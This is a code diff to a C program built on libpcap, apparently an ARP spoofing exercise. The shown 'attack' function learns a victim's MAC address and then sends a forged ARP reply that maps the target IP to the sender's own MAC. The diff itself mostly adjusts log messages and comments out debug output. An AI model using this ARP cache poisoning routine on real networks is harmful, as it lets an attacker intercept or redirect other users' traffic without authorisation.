@@ -100,23 +100,23 @@ int attack(char* dev, char* sip, char* tip){
 	
 	get_my_mac(dev,mymac);
 	get_my_ip(dev,myip);
-	printf("%s %s\n",mymac,myip);
+	printf("my mac and ip: %s %s\n",mymac,myip);
 	
 	pcap_t* handle = pcap_open_live(dev, ARP_SIZE, 1, 1, errbuf);
 	int tmp = send_arp(handle,Mac("ff:ff:ff:ff:ff:ff"),Mac(mymac),Mac("00:00:00:00:00:00"),Ip(myip),Ip(sip),ArpHdr::Request);
 	if(tmp==-1) return -1;
-	printf("sended arp!\n");
+	printf("sended arp request!\n");
 	while(1){
 		struct pcap_pkthdr* headr;
 		const u_char* pkt_data;
 		int res = pcap_next_ex(handle, &headr, &pkt_data);
-		for(int i=0; i<=41; i++) printf("%x,",pkt_data[i]);
-		printf("\n");
+		/*for(int i=0; i<=41; i++) printf("%x,",pkt_data[i]);
+		printf("\n");*/
 		if(res!=1){
 			fprintf(stderr,"pcap_next_ex return %d error=%s\n",res,pcap_geterr(handle));
 			return -1;
 		}
-		sprintf(pktip, "%d.%d.%d.%d\x00", pkt_data[28],pkt_data[29],pkt_data[30],pkt_data[31]);
+		//sprintf(pktip, "%d.%d.%d.%d\x00", pkt_data[28],pkt_data[29],pkt_data[30],pkt_data[31]);
 		uint16_t type = ntohs(*(uint16_t*)(&pkt_data[12]));
 		/*if(type == 0x0806 && strcmp(pktip, sip)==0){
 			sprintf(smac,"%02x:%02x:%02x:%02x:%02x:%02x",pkt_data[22],pkt_data[23],pkt_data[24],pkt_data[25],pkt_data[26],pkt_data[27]);
@@ -132,11 +132,13 @@ int attack(char* dev, char* sip, char* tip){
 	}
 	pcap_close(handle);
 	printf("\nSender's mac address captured\n");
+	printf("%s\n",smac);
 	
 	handle = pcap_open_live(dev, 0, 0, 0, errbuf);
 	tmp = send_arp(handle,Mac(smac),Mac(mymac),Mac(smac),Ip(tip),Ip(sip),ArpHdr::Reply);
 	if(tmp==-1) return -1;
 	pcap_close(handle);
+	printf("attack completed!\n");
 	return 0;
 }
 int main(int argc, char* argv[]) {
